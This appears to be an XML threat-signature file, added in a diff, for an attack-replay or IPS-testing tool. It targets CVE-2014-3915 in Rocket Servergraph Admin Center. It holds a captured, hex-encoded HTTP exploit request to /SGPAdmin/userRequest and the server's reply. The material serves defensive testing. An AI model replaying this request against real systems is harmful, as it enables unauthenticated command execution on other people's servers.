@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Rocket Servergraph Admin Center userRequest and tsmRequest Command Execution"/>
+    <EngDesc display="true" value="Multiple vulnerabilities exist in Rocket Servergraph, an interface for monitoring backup solutions such as IBM Tivoli Storage Manager, Symantec NetBackup etc. These vulnerabilities are due to input validation errors when handling requests to the URIs userRequest and tsmRequest.A remote unauthenticated attacker can exploit these vulnerabilities to achieve arbitrary command execution under the context of the SYSTEM user."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Rocket_software"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Servergraph_Admin_Center_for_TSM"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="1.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140603-14"/>
+    <CVEID display="true" value="CVE-2014-3915"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="107681"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="ad2955f708b3c5b08b98269c00c14734"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="COMPLETE"/>
+    <IntegImpact display="false" value="COMPLETE"/>
+    <AvailImpact display="false" value="COMPLETE"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635445867847656148"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="C">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:0D:CC" destMac="00:50:56:B4:0E:03" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00F8" Identification="D4AC" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="FC65" srcIP="172.16.8.176" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="59609" destPort="$HTTPdestPort" SeqNumber="C90BF935" AckNumber="058D790F" HeaderLength="08" WindowSize="0073" Checksum="214A" UrgentPointer="0000" Options="0101080A90532DA100000000" Payload="504F5354202F53475041646D696E2F757365725265717565737420485454502F312E310D0A486F73743A206468637032390D0A436F6E74656E742D4C656E6774683A2038310D0A636F6E74656E742D747970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465640D0A6163636570742D656E636F64696E673A20677A69702C206465666C6174650D0A757365722D6167656E743A20507974686F6E2D687474706C6962322F302E372E372028677A6970290D0A0D0A26696E766F6B65723D414141267469746C653D41414126706172616D733D4141412669643D41414126636D643D6175746826736F757263653D4141412671756572793D2663616C633A54454C5553565254" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="00:50:56:B4:0E:03" destMac="00:50:56:B4:0D:CC" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="021E" Identification="7DE1" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="120B" srcIP="$destIP" destIP="172.16.8.176" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="59609" SeqNumber="058D790F" AckNumber="C90BFA4A" HeaderLength="08" WindowSize="F9DB" Checksum="FB5F" UrgentPointer="0000" Options="0101080A0085C12790532DA1" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A43616368652D436F6E74726F6C3A20707269766174650D0A507261676D613A206E6F2D63616368650D0A5365742D436F6F6B69653A204A53455353494F4E49443D46354245423945373130344530384342374139333633434436334238413642383B20506174683D2F53475041646D696E2F3B20487474704F6E6C790D0A436F6E74656E742D547970653A20746578742F706C61696E3B636861727365743D5554462D380D0A436F6E74656E742D4C656E6774683A203232300D0A446174653A204672692C203237204A756E20323031342031383A34343A353820474D540D0A0D0A3C726177526573756C74206572726F723D2266616C7365223B20636F6C756D6E733D6E756C6C3B20646174613D323C454F4C3E687474703A2F2F77696E32303033656E7433323A38302F436F6E736F6C654F6E6C696E6548656C702F64656661756C742E68746D3F737461727461743D2F436F6E736F6C654F6E6C696E6548656C702F7376675F636F6E5F53475061646D696E5F67657474696E6773746172742D6368352E68746D3C454F4C3E415341412D444E41512D444636472D355A45542D414F32362D414846323C454F4C3E3B202F726177526573756C743E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
